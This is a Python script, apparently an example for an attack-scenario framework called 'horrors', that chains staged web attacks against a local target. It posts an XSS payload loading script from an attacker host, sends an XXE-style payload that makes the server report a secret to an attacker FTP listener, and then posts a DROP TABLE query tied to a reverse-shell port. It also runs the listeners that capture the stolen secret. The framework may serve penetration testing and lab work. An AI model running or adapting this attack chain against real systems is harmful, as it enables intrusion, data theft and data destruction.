#!/usr/bin/env python3

import requests

from horrors import (
    events,
    scenarios,
    services,
    triggers,
)


class Vulnerable(scenarios.Scenario):

    POST_HEADERS = {'Content-Type': 'application/x-www-form-urlencoded'}

    async def stage1(self):
        """Post XSS payload

        """
        requests.post(
            'http://{rhost}:{rport}/test/'.format(**self.context),
            data='field=<script src=http://{lhost}:{lport_http}/xss.js></script>'.format(**self.context),
            headers=self.POST_HEADERS,
            proxies=self.context['proxy']
        )

    async def stage2(self):
        """Wait for `xss` event triggered when request path contains `xss.js`

        """
        await events.Event.wait('xss')
        res = requests.get(
            'http://{rhost}:{rport}/userid/{username}'.format(**self.context),
            proxies=self.context['proxy']
        )
        self.context['userid'] = res.text

    async def stage3(self):
        """Post XXE payload using value `userid` stored in local context

        """
        requests.post(
            'http://{rhost}:{rport}/xml-import/'.format(**self.context),
            data='<?xml version="1.0" ?><something evil="{userid}">ftp://{lhost}:{lport_ftp}</something>'.format(**self.context),
            headers=self.POST_HEADERS,
            proxies=self.context['proxy']
        )

    async def stage4(self):
        """Wait for `xxe` event triggered when remote client connects via FTP and sends the secret

        """
        await events.Event.wait('xxe')
        requests.post(
            'http://{rhost}:{rport}/query/'.format(**self.context),
            data='secret={secret}&query=DROP+TABLE+IF+EXISTS+[...]{lhost}+{lport_reverse}'.format(
                secret=events.Event.lookup('secret'),
                **self.context
            ),
            headers=self.POST_HEADERS,
            proxies=self.context['proxy']
        )

    async def done(self):
        print('Done! 8-]')


if __name__ == "__main__":

    httpd = services.HTTPStatic({
        '/': 'This is home page...',
        '/xss.js': 'var payload = "something_is_wrong_here";',
        '/timestamp': services.HTTPStatic.timestamp,
    })
    httpd.send('xss', when=triggers.PathContains('xss.js'))

    ftpd = services.FTPReader()
    ftpd.send('xxe', when=triggers.DataMatch(r'.+SecretKey=(.+);', bucket='secret'))

    story = Vulnerable(
        rhost='127.0.0.1',
        rport=8008,
        lhost='127.0.0.1',
        lport_http=8888,
        lport_reverse=4444,
        lport_ftp=2121,
        username='evil',
        proxy={'http': 'http://127.0.0.1:8080'},
    )
    story.debug()
    story.spawn(httpd)
    story.spawn(ftpd)
    story.play()
